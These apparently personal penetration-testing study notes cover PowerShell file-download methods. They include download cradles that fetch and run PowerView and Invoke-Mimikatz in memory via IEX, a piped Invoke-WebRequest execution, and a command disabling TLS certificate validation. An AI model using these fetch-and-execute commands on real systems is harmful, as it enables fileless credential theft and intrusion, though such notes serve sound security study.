<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
<head>
<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
<title>Powershell-Web(http/s)</title>
</head><body>Use the powershell class:<ul><li style="list-style-type: none">System.Net.WebClient</li>
</ul>
<br/>
OpenRead<ul>Returns the data from a resource as a Stream</ul>
<br/>
OpenReadAsync<ul><li style="list-style-type: none">Returns the data from a resource without blocking the calling thread.</li>
</ul>
DownloadData<ul><li style="list-style-type: none">Downloads data from a resource and returns a Byte array.</li>
</ul>
DownloadDataAsync<ul><li style="list-style-type: none">Downloads data from a resource and returns a Byte array without blocking the calling thread.</li>
</ul>
DownloadFile<ul><li style="list-style-type: none">Downloads data from a resource to a local file.</li>
</ul>
DownloadFileAsync&#09;<ul>Downloads data from a resource to a local file without blocking the calling thread.</ul>
<br/>
DownloadString<ul><li style="list-style-type: none">Downloads a String from a resource and returns a String.</li>
</ul>
DownloadStringAsync<ul><div style="text-align: left"><span style="font-family: neue-haas-unica">Downloads a String from a resource without blocking the calling thread.</span></div></ul>
<br/>
<br/>
File Download:<br/>
Example:<ul><li style="list-style-type: none">(New-Object Net.WebClient).DownloadFile('&lt;Target File URL&gt;','&lt;Output File Name&gt;') &nbsp; &nbsp;</li>
</ul>
InsertedExample:<ul><li style="list-style-type: none">(New-Object Net.WebClient).DownloadFileAsync('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1', 'C:\Users\Public\Downloads\PowerViewAsync.ps1') &nbsp;</li>
<li style="list-style-type: none"></li>
</ul>
Download a string and run it directly with IEX in memory without saving it to the disk<br/>
Example:<ul><div style="text-align: left"><span style="font-family: neue-haas-unica">PS C:\htb&gt; IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-Mimikatz.ps1') </span></div></ul>
&nbsp;<br/>
IEX also allows pipeline Input:<div style="text-align: left"><span style="font-family: neue-haas-unica"></span></div><ul><li style="list-style-type: none"><div style="text-align: left"><span style="font-family: neue-haas-unica">PS C:\htb&gt; (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-Mimikatz.ps1') | IEX </span></div></li>
</ul>
<br/>
Via Web-Request (PS &gt; 3.0)<ul><li style="list-style-type: none"><div style="text-align: left"><span style="font-family: neue-haas-unica">PS C:\htb&gt; Invoke-WebRequest https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/dev/Recon/PowerView.ps1 -OutFile PowerView.ps1 </span></div></li>
<li style="list-style-type: none"></li>
</ul>
Good Powershell list of Download cradles:<ul><li style="list-style-type: none">https://gist.github.com/HarmJ0y/bb48307ffa663256e239 &nbsp;</li>
<li style="list-style-type: none"></li>
</ul>
<br/>
Common Errors with powershell:<ul><li style="list-style-type: none">InternetExplorer first-launch config has not been completed:</li>
<li style="list-style-type: none"><ul><li style="list-style-type: none">Bypassed by using the paramter: -UseBasicParsing</li>
<li style="list-style-type: none"><ul><li style="list-style-type: none"><div style="text-align: left"><span style="font-family: neue-haas-unica">PS C:\htb&gt; Invoke-WebRequest https://&lt;ip&gt;/PowerView.ps1 -UseBasicParsing | IEX </span></div></li>
</ul>
</li>
</ul>
</li>
<li style="list-style-type: none">SSL/TLS channel cert. is not trusted</li>
<li style="list-style-type: none"><ul><li style="list-style-type: none">Bypassed with the command:</li>
<li style="list-style-type: none"><ul><div style="text-align: left"><span style="font-family: neue-haas-unica"><li style="list-style-type: none">PS C:\htb&gt; [System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true} </li>
</span></div></ul>
</li>
</ul>
</li>
<li style="list-style-type: none"></li>
<li style="list-style-type: none"><ul><li style="list-style-type: none"><ul><li style="list-style-type: none">&nbsp;</li>
</ul>
</li>
</ul>
</li>
<li style="list-style-type: none"></li>
<li style="list-style-type: none"><ul><li style="list-style-type: none"></li>
</ul>
</li>
</ul>
&nbsp;<ul><li style="list-style-type: none"><ul><li style="list-style-type: none"><ul><li style="list-style-type: none"></li>
<li style="list-style-type: none">&nbsp;</li>
</ul>
</li>
</ul>
</li>
<li style="list-style-type: none"></li>
</ul>
</body></html>